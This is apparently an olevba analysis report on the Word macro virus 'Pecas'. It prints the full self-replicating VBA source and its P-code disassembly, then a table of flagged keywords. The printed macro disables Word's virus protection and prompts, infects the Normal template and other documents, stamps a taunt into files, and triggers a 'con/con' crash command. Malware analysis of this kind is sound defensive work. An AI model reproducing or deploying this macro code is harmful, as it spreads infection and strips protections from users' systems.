olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pecas
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Pecas.cls 
in file: Virus.MSWord.Pecas - OLE stream: 'Macros/VBA/Pecas'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'morris
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
pos = 3
x = "Private Sub Document_Open()"
paso2 = False
pasada:
cont = nt.CodeModule.CountOfLines
coad = ad.CodeModule.CountOfLines
If nt.CodeModule.lines(1, 1) <> "'morris" Then
nt.CodeModule.DeleteLines 1, cont
 If nt.Name <> "Pecas" Then
   nt.Name = "Pecas"
 End If
nt.CodeModule.AddFromString ("'morris")
 If paso2 = False Then
  nt.CodeModule.AddFromString ("Private Sub Document_Close()")
  nt.CodeModule.InsertLines pos, ad.CodeModule.lines(pos, coad)
 Else
  nt.CodeModule.AddFromString (x)
  nt.CodeModule.InsertLines pos, ad.CodeModule.lines(pos, coad)
   If InStr(1, ActiveDocument.Name, "Document") = False Then
    Selection.TypeText "Game´s over. morris Win......."
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
   Else
    ActiveDocument.Saved = True
   End If
 End If
End If
If paso2 = True Then
  If Day(Now) = Minute(Now) Then
   ser$ = Shell("con/con", vbNormalFocus)
  End If
Exit Sub
Else
 paso2 = True
 Set ad = NormalTemplate.VBProject.VBComponents.Item(1)
 Set nt = ActiveDocument.VBProject.VBComponents.Item(1)
 GoTo pasada
End If
End Sub
'Made in Mexico by morris , te Amo Pecas IDyahoo m0rr1z








-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Pecas
' ===============================================================================
' Module streams:
' Macros/VBA/Pecas - 3310 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0006 "morris"
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #4:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #6:
' 	LitDI2 0x0003 
' 	St pos 
' Line #7:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	St x 
' Line #8:
' 	LitVarSpecial (False)
' 	St paso2 
' Line #9:
' 	Label pasada 
' Line #10:
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cont 
' Line #11:
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St coad 
' Line #12:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0007 "'morris"
' 	Ne 
' 	IfBlock 
' Line #13:
' 	LitDI2 0x0001 
' 	Ld cont 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #14:
' 	Ld nt 
' 	MemLd New 
' 	LitStr 0x0005 "Pecas"
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0005 "Pecas"
' 	Ld nt 
' 	MemSt New 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	LitStr 0x0007 "'morris"
' 	Paren 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #18:
' 	Ld paso2 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Paren 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #20:
' 	Ld pos 
' 	Ld pos 
' 	Ld coad 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #21:
' 	ElseBlock 
' Line #22:
' 	Ld x 
' 	Paren 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #23:
' 	Ld pos 
' 	Ld pos 
' 	Ld coad 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #24:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #25:
' 	LitStr 0x001E "Game´s over. morris Win......."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #26:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #27:
' 	ElseBlock 
' Line #28:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	Ld paso2 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #33:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #34:
' 	LitStr 0x0007 "con/con"
' 	Ld vbNormalFocus 
' 	ArgsLd Shell 0x0002 
' 	St ser$ 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	ExitSub 
' Line #37:
' 	ElseBlock 
' Line #38:
' 	LitVarSpecial (True)
' 	St paso2 
' Line #39:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #40:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #41:
' 	GoTo pasada 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	EndSub 
' Line #44:
' 	QuoteRem 0x0000 0x0036 "Made in Mexico by morris , te Amo Pecas IDyahoo m0rr1z"
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

